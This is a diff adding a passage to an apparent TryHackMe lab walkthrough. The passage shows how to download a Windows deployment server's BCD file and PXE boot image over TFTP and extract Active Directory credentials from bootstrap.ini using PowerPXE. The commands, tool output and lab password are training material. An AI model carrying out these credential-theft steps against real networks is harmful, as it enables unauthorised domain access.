@@ -365,3 +365,47 @@ With this initial information now recovered from DHCP (wink wink), we can enumer
 `ssh thm@THMJMP1.za.tryhackme.com`  
 and the password of `Password1@`.  
 To ensure that all users of the network can use SSH, start by creating a folder with your username and copying the powerpxe repo into this folder:
+```
+C:\Users\THM>cd Documents
+C:\Users\THM\Documents> mkdir <username>
+C:\Users\THM\Documents> copy C:\powerpxe <username>\
+C:\Users\THM\Documents\> cd <username>
+```
+The first step we need to perform is using TFTP and downloading our BCD file to read the configuration of the MDT server. TFTP is a bit trickier than FTP since we can't list files. Instead, we send a file request, and the server will connect back to us via UDP to transfer the file. Hence, we need to be accurate when specifying files and file paths. The BCD files are always located in the /Tmp/ directory on the MDT server. We can initiate the TFTP transfer using the following command in our SSH session:
+```
+C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
+Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
+```
+You will have to lookup THMMDT IP with nslookup thmmdt.za.tryhackme.com. With the BCD file now recovered, we will be using [powerpxe](https://github.com/wavestone-cdt/powerpxe) to read its contents. Powerpxe is a PowerShell script that automatically performs this type of attack but usually with varying results, so it is better to perform a manual approach. We will use the Get-WimFile function of powerpxe to recover the locations of the PXE Boot images from the BCD file:
+```
+C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.   
+
+PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
+PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
+PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
+>> Parse the BCD file: conf.bcd
+>>>> Identify wim file : <PXE Boot Image Location>
+<PXE Boot Image Location>
+```
+WIM files are bootable images in the Windows Imaging Format (WIM). Now that we have the location of the PXE Boot image, we can again use TFTP to download this image:
+```
+PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
+Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
+```
+This download will take a while since you are downloading a fully bootable and configured Windows image. Maybe stretch your legs and grab a glass of water while you wait.
+
+### Recovering Credentials from a PXE Boot Image
+Now that we have recovered the PXE Boot image, we can exfiltrate stored credentials. It should be noted that there are various attacks that we could stage. We could inject a local administrator user, so we have admin access as soon as the image boots, we could install the image to have a domain-joined machine. If you are interested in learning more about these attacks, you can read this [article](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/). This exercise will focus on a simple attack of just attempting to exfiltrate credentials.  
+Again we will use powerpxe to recover the credentials, but you could also do this step manually by extracting the image and looking for the bootstrap.ini file, where these types of credentials are often stored. To use powerpxe to recover the credentials from the bootstrap file, run the following command:
+```
+PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
+>> Open pxeboot.wim
+>>>> Finding Bootstrap.ini
+>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
+>>>> >>>> UserID = <account>
+>>>> >>>> UserDomain = ZA
+>>>> >>>> UserPassword = <password>
+```
+As you can see, powerpxe was able to recover the AD credentials. We now have another set of AD credentials that we can use!
